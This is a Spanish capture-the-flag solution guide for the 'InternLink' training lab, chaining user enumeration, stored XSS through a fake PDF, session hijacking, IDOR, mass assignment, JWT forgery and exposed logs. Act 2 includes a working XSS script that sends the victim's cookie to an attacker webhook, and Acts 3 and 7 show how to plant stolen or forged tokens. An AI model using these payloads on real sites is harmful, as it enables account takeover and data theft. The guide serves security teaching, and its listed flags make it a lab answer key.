# Solución del laboratorio InternLink

Este documento describe el flujo completo para resolver el laboratorio: desde un usuario estudiante hasta administrador, explotando las vulnerabilidades en cadena y obteniendo cada flag.

**Objetivo:** Escalar privilegios desde una cuenta de estudiante normal hasta administrador, descubriendo las 9 flags en el orden lógico del lab.

---

## Resumen de flags

| #   | Flag                              | Vulnerabilidad                          |
| --- | --------------------------------- | --------------------------------------- |
| 1   | `FLAG{user_enumeration_is_real}`  | Enumeración de usuarios                 |
| 2   | `FLAG{stored_xss_persisted}`      | Stored XSS vía subida de CV             |
| 3   | `FLAG{session_hijacked}`          | Session hijacking (cookie sin HttpOnly) |
| 4   | `FLAG{idor_horizontal}`           | IDOR horizontal en candidatos           |
| 5   | `FLAG{mass_assignment_abuse}`     | Mass assignment en perfil               |
| 6   | `FLAG{binary_files_hide_secrets}` | Archivo binario sin extensión           |
| 7   | `FLAG{jwt_forged_successfully}`   | JWT con secret débil                    |
| 8   | `FLAG{logs_are_sensitive}`        | Logs expuestos                          |
| 9   | `FLAG{internlink_compromised}`    | Acceso total como admin                 |

---

## Acto 1 — Enumeración de usuarios e invitación

**Contexto:** La primera pantalla pide el **correo de quien te invitó** a la aplicación. No tienes ese dato, así que hay que descubrirlo.

**Vulnerabilidad:** La misma ruta de verificación, `/api/check-email`, acepta **GET** además de POST. Está mal implementada: al hacer GET devuelve una lista de usuarios registrados en el sistema (filtro incorrecto que filtra por “registrados”) e incluye un campo que indica qué usuarios **pueden invitar**. Solo dos tienen ese permiso (coordinador y administrador). Al hacer **POST** con el correo de uno de esos dos invitadores válidos, se verifica la invitación, se desbloquea el acceso (cookie) y se devuelve la flag en un header.

**Pasos:**

1. Abre la aplicación. Verás la pantalla de **verificación de invitación**: se pide el "Correo del invitador". Hay una pista que indica que la misma ruta acepta consultas por otros medios (por ejemplo GET).
2. Como no tienes el correo del invitador, prueba a llamar a la **misma URL con GET**: `GET /api/check-email` (en el navegador, DevTools o con `curl`). La respuesta es JSON con un array `usuarios`: cada elemento tiene `email` y `puede_invitar` (true/false). Solo dos correos tienen `puede_invitar: true` (p. ej. `coordinador@internlink.com` y `admin@internlink.com`).
3. En el formulario de la página, ingresa uno de esos dos correos (el de un invitador válido) y pulsa **Verificar invitación** (POST).
4. Si el correo es válido como invitador, verás el mensaje de éxito y los enlaces **Iniciar sesión** y **Crear cuenta nueva**. En esa respuesta (POST), el header `X-Request-Id` contiene **Flag 1:** `FLAG{user_enumeration_is_real}`. Revisa los headers en DevTools (Network → respuesta al POST a `check-email`) o con `curl -i`.
5. Si usas un correo registrado pero que no puede invitar (p. ej. empresa o estudiante), la API responderá que ese usuario no tiene permiso para invitar. Solo los dos con `puede_invitar: true` desbloquean el acceso.
6. Para seguir el lab: haz clic en **Crear cuenta nueva**, regístrate con tu propio correo como estudiante y continúa con el Acto 2.

---

## Acto 2 — Stored XSS vía subida de CV

**Vulnerabilidad:** La subida de CV solo valida la **extensión** (`.pdf`). No se comprueba el tipo MIME real. Puedes subir un archivo HTML renombrado como `.pdf`. El sistema lo guarda y lo sirve como HTML en `/view-cv/<filename>`, y un proceso automático “revisa” el CV, ejecutando el JavaScript del archivo.

**Pasos:**

1. Crea un archivo HTML con un script que envíe la cookie (o otros datos) a tu webhook. Ejemplo base (solo sustituye `TU_WEBHOOK_AQUI` por la URL de tu webhook, p. ej. de webhook.site o RequestBin):

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>CV</title>
  </head>
  <body>
    <h1>Currículum</h1>
    <p>Contenido de ejemplo.</p>
    <script>
      (function () {
        var w = "TU_WEBHOOK_AQUI";
        var x = new Image();
        x.src = w + "?c=" + encodeURIComponent(document.cookie || "(vacío)");
      })();
    </script>
  </body>
</html>
```

2. Guárdalo como `cv.pdf` (solo cambia la extensión a `.pdf`).
3. Con tu usuario estudiante, sube ese “CV” en el panel (Subir Currículum Vitae).
4. El servidor guarda el archivo y simula una revisión automática. En esa revisión se envía una petición a tu webhook con la cookie de la empresa y la flag de este acto.
5. **Flag 2:** En tu webhook verás una petición GET con dos parámetros en la URL: `c` (cookie de la empresa, ver Acto 3) y **`flag`** = `FLAG{stored_xss_persisted}`. Revisa la pestaña Query/Params de la petición para copiar la flag.

---

## Acto 3 — Session hijacking

**Vulnerabilidad:** La cookie de sesión (`session_token`) no tiene el flag `HttpOnly`. Cuando el proceso automático “revisa” el CV subido, simula que una empresa (TechCorp) abre ese archivo. El sistema detecta la URL de tu webhook en el HTML y envía la cookie de sesión de la empresa a esa URL, como si el script del CV la hubiera exfiltrado.

**Pasos:**

1. Tras subir el “CV” malicioso del Acto 2 (con tu webhook dentro del HTML), el servidor ejecuta la revisión automática y **envía la cookie de la empresa** a tu webhook. No hace falta que nadie abra el enlace a mano.
2. Abre tu webhook (webhook.site, RequestBin, etc.). Verás una petición **GET** con los parámetros `c` (cookie exfiltrada) y `flag` (Flag 2). En Query/Params: `c` = `session_token=<valor_hex>` y `flag` = `FLAG{stored_xss_persisted}`.
3. Copia el **valor** de `session_token` (solo la parte hexadecimal larga, o la cadena completa `session_token=...` si usas la consola).
4. En tu navegador (o en una ventana de incógnito), abre DevTools → Console y establece la cookie y recarga:
   ```js
   document.cookie = "session_token=VALOR_HEX_QUE_COPIASTE";
   location.href = "/";
   ```
5. Deberías entrar al **panel de empresa** (TechCorp).
6. **Flag 3:** En el panel de empresa, en la sección “Información de Cuenta”, el campo **API Key** contiene la flag: `FLAG{session_hijacked}` (viene en un valor tipo `tc_prod_FLAG{session_hijacked}_v2`). A partir de aquí puedes seguir con el Acto 4 (IDOR) desde ese mismo panel.

---

## Acto 4 — IDOR horizontal

**Vulnerabilidad:** El endpoint `/api/company/candidates` acepta el parámetro `company_id` y devuelve los candidatos/pasantías de esa empresa **sin comprobar** que el usuario autenticado sea de esa empresa. Puedes pedir candidatos de otras empresas cambiando `company_id`.

**Pasos:**

1. Sigue con la sesión de empresa (la que robaste en el Acto 3) o inicia sesión como empresa si lo prefieres.
2. En el panel de empresa, al cargar “Candidatos”, la app llama a algo como:
   `GET /api/company/candidates?company_id=1`
3. Cambia el parametro a `company_id=2` (otra empresa). La respuesta incluye candidatos de DataFlow Inc con datos normales. No hay flag ahi.
4. Prueba con `company_id=3` (SecureLog Corp). Esa empresa tiene datos mas confidenciales.
5. **Flag 4:** En la **evaluacion** de uno de los candidatos (p. ej. Patricia Mora) aparece la flag: `FLAG{idor_horizontal}`.
6. Revisa la respuesta completa de `company_id=3`. La API devuelve **`internal_ref`**, **`audit_note`** y **`doc_url`**. La nota hace referencia a documentacion interna de SecureLog Corp: **`/internal/docs/securelog-corp`**. Abre esa URL (p. ej. `http://localhost:5000/internal/docs/securelog-corp`). La pagina esta redactada como doc de uso interno para el equipo de RRHH de SecureLog: explica "validacion de perfiles" en la plataforma y como actualizar el rol (p. ej. a coordinador) con ejemplos de **curl para Linux/macOS y Windows** listos para copiar. Es el recurso que ellos usan y que nos estamos encontrando.

---

## Acto 5 — Mass assignment

**Contexto:** En el Acto 4, al revisar los datos confidenciales de SecureLog Corp, viste una referencia a su documentacion interna (`/internal/docs/securelog-corp`). Esa pagina esta escrita para su equipo (validacion de perfiles, actualizar rol). El siguiente paso es usar esos ejemplos de curl con tu sesion de **estudiante** (no de empresa).

**Vulnerabilidad:** El endpoint `PUT /api/profile/update` acepta cualquier campo en el JSON (no hay lista blanca). Si envias `role`, el backend lo persiste y la sesion se actualiza.

**Pasos:**

1. Cierra sesion de empresa e inicia sesion como **estudiante**.
2. Abre DevTools → Application → Cookies y copia el valor de **`session_token`**.
3. Abre <code>/internal/docs/securelog-corp</code>. Copia el comando de una linea segun tu sistema: **Linux/macOS**, **Windows (PowerShell)** o **Windows (CMD)**.
4. Sustituye <code>TU_SESSION_TOKEN</code> por el valor de la cookie y ejecuta el comando.
5. Si la respuesta es JSON con <code>"success": true</code>, recarga la app; deberias pasar al **panel de coordinador**. (Si envias <code>role: "admin"</code> el servidor responde 403; hay que usar <code>coordinator</code>.)
6. **Flag 5:** En el panel de coordinador, en **Avisos del sistema**, uno de los avisos contiene la flag: `FLAG{mass_assignment_abuse}`.

---

## Acto 6 — Archivo binario sin extensión

**Vulnerabilidad:** El endpoint `/exports/candidates` (accesible como coordinador) devuelve un archivo que en realidad es un Excel (XLSX) pero se sirve **sin extensión** y como contenido binario genérico. La URL no muestra `.xlsx`, por lo que el navegador puede mostrar datos “raros”. Dentro del Excel hay una hoja con configuración interna y una flag.

**Pasos:**

1. Con sesión de **coordinador** (del Acto 5), en el panel usa el enlace “Descargar Reporte” que apunta a `/exports/candidates`.
2. Se descarga un archivo sin extensión (nombre tipo `candidates`). Ábrelo con un editor de texto o revisa los primeros bytes: verás la firma de un ZIP/Office (PK…).
3. En Linux/Mac: `file candidates` → indicará que es un ZIP o Excel. Renómbralo a `candidates.xlsx`.
4. En Windows: renómbralo a `candidates.xlsx` y ábrelo con Excel o LibreOffice.
5. Además de la hoja de candidatos, hay una hoja **Configuracion** con parámetros como `jwt_secret`, `admin_jwt_payload`, `admin_endpoint`, `system_token`, etc.
6. **Flag 6:** En esa hoja aparece la flag: `FLAG{binary_files_hide_secrets}` (campo `system_token`).
7. Anota `jwt_secret`, `admin_jwt_payload` (el JSON que debe llevar el JWT) y `admin_endpoint`; los usarás en el Acto 7 para forjar el token.

---

## Acto 7 — JWT con secret débil

**Vulnerabilidad:** El panel de administrador acepta JWT (cookie `admin_token` o header `Authorization: Bearer <token>`). El secret y el payload esperado están en el Excel del Acto 6 (`jwt_secret` y `admin_jwt_payload`). Con eso puedes generar un token válido.

**Cómo conocer el payload:** En la hoja **Configuracion** del Excel aparece la fila **`admin_jwt_payload`** con el JSON exacto que espera el servidor (p. ej. `{"user_id":"1","email":"admin@internlink.com","role":"admin"}`). No hay que adivinarlo.

**Cómo generar el JWT (elegir una):**

- **Opción A — jwt.io:** Ve a https://jwt.io. En "Payload" pega el valor de `admin_jwt_payload` del Excel. En "Verify Signature" pega el `jwt_secret`. Algoritmo HS256. La web genera el token; copia la parte del token (cabecera.payload.firma).
- **Opción B — Script del repo:** Con el secret anotado del Excel (p. ej. `internlink2024`):
  ```bash
  python payloads/jwt_forge.py internlink2024
  ```
  El script usa el payload por defecto (el mismo del Excel) e imprime el token listo para copiar.

**Pasos:**

1. Genera el token con la opción A o B.
2. En el navegador, DevTools → Application → Cookies (o consola):
   ```js
   document.cookie = "admin_token=TOKEN_GENERADO; path=/";
   location.href = "/dashboard/admin";
   ```
3. Deberías entrar al **panel de administración**.
4. **Flag 7:** En el panel admin, en **Configuración del sistema**, el campo `admin_verification` tiene el valor: `FLAG{jwt_forged_successfully}`.

---

## Acto 8 — Logs expuestos (pista por mal diseño)

**Contexto:** La ruta del archivo de log no es algo que el atacante deba adivinar. Por mal diseño, en el **panel de administración** (al que accedes con el JWT forjado en el Acto 7), en la tabla **Configuración del sistema**, aparece el parámetro **`debug_log_path`** con valor `/logs/debug.log`. El texto del panel indica que "soporte puede consultar los registros del sistema (ruta indicada en Configuración)". Así el estudiante descubre que existe un recurso de logs y su URL.

**Vulnerabilidad:** El archivo de log del servidor está accesible **sin autenticación** en esa ruta. Cualquiera que conozca la URL (por la pista del Excel o del panel admin) puede leer su contenido.

**Pasos:**

1. Entra al **panel de administración** (JWT del Acto 7). En la tabla **Configuración del sistema** aparece el parámetro **`debug_log_path`** con valor `/logs/debug.log`. El texto del panel indica que "soporte puede consultar los registros del sistema (ruta indicada en Configuración)".
2. En el navegador (o con curl) solicita: `GET http://localhost:5000/logs/debug.log`.
3. Se devuelve el contenido del log en texto plano: mensajes de arranque, intentos de login, errores y un token de auditoría.
4. **Flag 8:** En el log aparece la línea: `FLAG{logs_are_sensitive}` (token de auditoría del sistema). En un escenario real, ese token podría usarse para acceder a sistemas de backup o auditoría.

---

## Acto final — Misión: compromiso total (flag 9)

**Historia:** Has escalado desde estudiante hasta administrador: robaste sesión de empresa, abusaste de IDOR y de mass assignment, extrajiste secretos del Excel y forjaste el JWT de admin. Ahora estás dentro del **panel de administración**. La misión final es demostrar que el compromiso es total: no solo tienes control sobre la plataforma, sino que puedes leer la configuración crítica y seguir la pista que la propia aplicación deja (los logs) para obtener una prueba más de que la organización no protege sus activos sensibles.

**Objetivo en el panel admin:**

1. **Probar control total (Flag 9)**  
   Con la cookie `admin_token` ya establecida (Acto 7), en la sección **Configuración del sistema** aparecen todos los parámetros internos. El valor de **`master_key`** es: **`FLAG{internlink_compromised}`**. Esa es la prueba de que tienes acceso a la "llave maestra" que en un entorno real protegería operaciones críticas.

2. **Descubrir la pista de los logs (Acto 8)**  
   En esa misma tabla verás el parámetro **`debug_log_path`** = `/logs/debug.log`. Por mal diseño, el panel expone la ruta donde se guardan los logs. Visita esa URL (no requiere autenticación) y en el contenido del archivo encontrarás la **Flag 8:** `FLAG{logs_are_sensitive}` (token de auditoría). Cierre realista: no solo conseguiste el panel admin, sino que la propia configuración te indicó dónde estaban los logs sensibles, completando el cuadro del compromiso.

**Resumen del flujo final:** Entras al dashboard de admin → lees `master_key` (flag 9) y `debug_log_path` → visitas `/logs/debug.log` y obtienes la flag 8. El "chiste" final es que el panel, pensado para soporte y operaciones, filtra información que no debería estar ahí y apunta a un recurso (logs) que además está expuesto sin control de acceso.

---

## Orden recomendado (cadena completa)

1. **Acto 1** — Pantalla "correo del invitador": no tienes ese correo. La misma ruta `/api/check-email` acepta GET; al usarla ves la lista de usuarios registrados y cuáles tienen `puede_invitar: true` (solo dos). Usa uno de esos en el formulario (POST); al verificar correctamente obtienes la flag en el header `X-Request-Id` y el desbloqueo para login/registro.
2. **Registro** como estudiante (clic en "Crear cuenta nueva" tras verificar la invitación).
3. **Acto 2** — Subir CV HTML como `.pdf`, comprobar XSS (y que la revisión interna ejecuta el script).
4. **Acto 3** — Robar cookie de sesión vía XSS, suplantar sesión de empresa y leer la API Key en el panel (flag 3).
5. **Acto 4** — Con sesión de empresa, pedir candidatos con `company_id=3` y leer la evaluación que contiene la flag 4; anotar `doc_url` y abrir `/internal/docs/securelog-corp`.
6. **Acto 5** — Con sesión de estudiante, enviar `PUT /api/profile/update` con `"role": "coordinator"`, recargar y entrar al panel de coordinador; leer la flag 5 en Avisos.
7. **Acto 6** — Descargar `/exports/candidates`, renombrar a `.xlsx`, abrir la hoja **Configuracion**: obtener flag 6 (`system_token`), `jwt_secret`, `admin_jwt_payload`, `admin_endpoint`.
8. **Acto 7** — Forjar JWT con el payload y secret del Excel, establecer `admin_token` y acceder a `/dashboard/admin`; leer flag 7 en `admin_verification`.
9. **Acto final** — En el panel admin: leer **`master_key`** → **Flag 9** (`FLAG{internlink_compromised}`). En la misma tabla ver **`debug_log_path`**, visitar `/logs/debug.log` → **Flag 8** (`FLAG{logs_are_sensitive}`).

Con esto se completa la misión del laboratorio: escalada completa y demostración de que el mal diseño (exponer la ruta de logs en la configuración del panel admin) permite descubrir y abusar de un recurso sensible más.
